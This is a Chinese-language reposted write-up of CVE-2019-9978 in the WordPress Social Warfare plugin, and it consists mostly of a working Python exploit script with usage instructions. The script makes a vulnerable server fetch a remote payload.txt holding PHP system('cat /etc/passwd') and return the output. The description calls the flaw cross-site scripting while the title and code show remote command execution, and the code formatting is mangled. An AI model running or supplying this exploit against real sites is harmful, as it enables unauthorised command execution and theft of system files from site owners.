# （CVE-2019-9978）WordPress Plugin - social warfare 远程命令执行漏洞

> 原文：[https://www.zhihuifly.com/t/topic/3248](https://www.zhihuifly.com/t/topic/3248)

# （CVE-2019-9978）WordPress Plugin - social warfare 远程命令执行漏洞

## 一、漏洞简介

WordPress social-warfare插件3.5.3之前版本中存在跨站脚本漏洞。远程攻击者可借助‘swp_url’参数利用该漏洞注入恶意的JavaScript脚本。

## 二、漏洞影响

Social WarFare Plugin (<=3.5.2)

## 三、复现过程

### poc

> 首先在自己的服务器上传http(s)://www.0-sec.org/payload.txt

```
<pre>system('cat /etc/passwd')</pre> 
```

> useage
> 
> ```
>  python cve-2019-9978.py --target http://vulntarget.com \
>                          --payload-uri http://yourpayloadsite.com/payload.txt 
> ```

```
# title: "RCE in Social Warfare Plugin ( <=3.5.2 )"
# Date: March, 2019
# Researcher: Luka Sikic
# Exploit Author: hash3liZer
# Download Link: https://wordpress.org/plugins/social-warfare/
# Version: <= 3.5.2
# CVE: CVE-2019-9978

import sys

import requests

import re

import urlparse

import optparse

class EXPLOIT:

```
VULNPATH = "wp-admin/admin-post.php?swp_debug=load_options&amp;swp_url=%s"

def __init__(self, _t, _p):
	self.target  = _t
	self.payload = _p

def engage(self):
	uri = urlparse.urljoin( self.target, self.VULNPATH % self.payload )
	r = requests.get( uri )
	if r.status_code == 500:
		print "[*] Received Response From Server!"
		rr  = r.text
		obj = re.search(r"^(.*)&lt;\!DOCTYPE", r.text.replace( "\n", "lnbreak" ))
		if obj:
			resp = obj.groups()[0]
			if resp:
				print "[&lt;] Received: "
				print resp.replace( "lnbreak", "\n" )
			else:
				sys.exit("[&lt;] Nothing Received for the given payload. Seems like the server is not vulnerable!")
		else:
			sys.exit("[&lt;] Nothing Received for the given payload. Seems like the server is not vulnerable!")
	else:
		sys.exit( "[~] Unexpected Status Received!" ) 
```

def main():

parser = optparse.OptionParser(  )

```
parser.add_option( '-t', '--target', dest="target", default="", type="string", help="Target Link" )
parser.add_option( ''  , '--payload-uri', dest="payload", default="", type="string", help="URI where the file payload.txt is located." )

(options, args) = parser.parse_args()

print "[&gt;] Sending Payload to System!"
exploit = EXPLOIT( options.target, options.payload )
exploit.engage() 
``` `if **name** == “**main**”:

main()` 
```